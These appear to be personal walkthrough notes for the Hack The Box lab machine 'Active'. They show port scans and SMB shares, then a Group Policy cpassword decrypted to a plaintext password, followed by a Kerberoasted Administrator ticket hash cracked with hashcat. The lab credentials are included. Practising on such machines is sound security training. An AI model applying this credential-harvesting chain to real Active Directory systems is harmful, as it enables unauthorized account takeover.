IP: 10.10.10.100
Nmap scan
```bash
PORT      STATE SERVICE       VERSION
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-04-29 15:26:38Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
```

play around with ldap
didnt find anything.
SMB enumeration:
```bash
	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
```
Replication has groups.xml
```bash
<Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/>
```
password decrypts with gpp-decrypt : GPPstillStandingStrong2k18

now try ldap with the credentials.
it works and carving out usernames you have SVC_TGS and administrator

GetADUsers.py output
```bash
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2018-07-19 05:06:40.351723  2022-04-30 01:27:45.733372 
Guest                                                 <never>              <never>             
krbtgt                                                2018-07-19 04:50:36.972031  <never>             
SVC_TGS                                               2018-07-19 06:14:38.402764  2018-07-22 00:01:30.320277 
```

Try GetUserSPN as admin seems to be a service account
```bash
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$64634a68b5d1b458e3c33b4baf3d9e9a$ef77ce20f1175d935f1ba4b99d08097910d60f7048108ed6d05c870ffef703be1646d4661cc1447c4caaf30c6e24ebff6c6ac4644a914e8fb13fd76029359c30c60e6531570226f94f133b99a1e3858c5e350cf43162b4b4c09d9ab680cdd10367ad9905c00146f76a8834d60a8862f66bd9a303e0b1a61315badb9971db92e4a893e40763887373ce3d7de9e10f1715aaab8f8fb4454b8218eb3fae9e098723e3e1521ced4950118aa0d101b380022da3c9ab6981b9c2c46c282b6d859788863be8c784c6dce19bcea33112a3d3229bb328e09ec25199699e30af314fd6f4cc639a808e9db95d33cfa5fb18f11d7ae57126425a29dcaf08cb311cfabb29cf14614bfc6e19b16d6c8c3010aefd143362d7078dc6dae9f390c47e3b4cf4e8e903ccae8af093c31ae58cf492e7f9b640833f92b9b23a24ab501b2e9c82e8f2b0657f349659b7dc20d0f5c6adefd5f2c4ae773f1a837f7bed5472c8850a9a695e51f8a16a37c6b6de12045285e4702a7f0862f856242dcbca95d762fda0e5147682fe6b3932fed0b2e4fafcb16fe1c459d152b996eb37a10b0a157c19cd1667f86c593a57170e8e8914b590fc91bacca8d0dd5c7d53e45046e572949774c17b4daac3c0e416057d89ab679d115abd233be9d5f16f03f837587d30faad9a698688690a1ca1b13ef7071dd49ead8c99a6b9ee3078784a1db81c1524a6d33f608c1d94dd91ea899b87ddc9ada5d3ae24aceacc0b7aa5dcd6806603da0464c7f3523fce976836c6db746e003be8d611ef9ec8959cfe81e6248e7c412dbf59ccecfca493a75b31b98b441168fe7317912500facc7767a5169f9fe136c53b9bf2a490660587d5077b6f5f9fe45ce94f2309fa39602f645ec9fde1763c91ded9b7f9c6c8fd5df07c7865726d7e62619e1c83c96d5af847994a45e038eda090e6bc9459d5134f5748602d2270768159ff16786ec33655af2aa83b9f6f354a87121f9ad25795b88fab1546caddba2df62d2620d59a0db8e355912ce834892cc77e6d0dd67166421bf76e6332c589e54fa19097a8557f54b7d187d94460e0685747bfe3c1d5266d238cf1317f64417982fc72d6c47bb838f0426d97c1b650e469d6fc1e769505bf50c076169dc8715dcfa0ff9871aa30ddbf146c70763b681287ddcd7c8132d39c06406cc71b1713fe7fa28a55fcb17454ca503ecf3ca7c19284f35d87ca2fa5da4c79f508aaf19a99fa4b2367533424cd8da3866d0ee22d5b52
```

cracked with hashcat as Ticketmaster1968
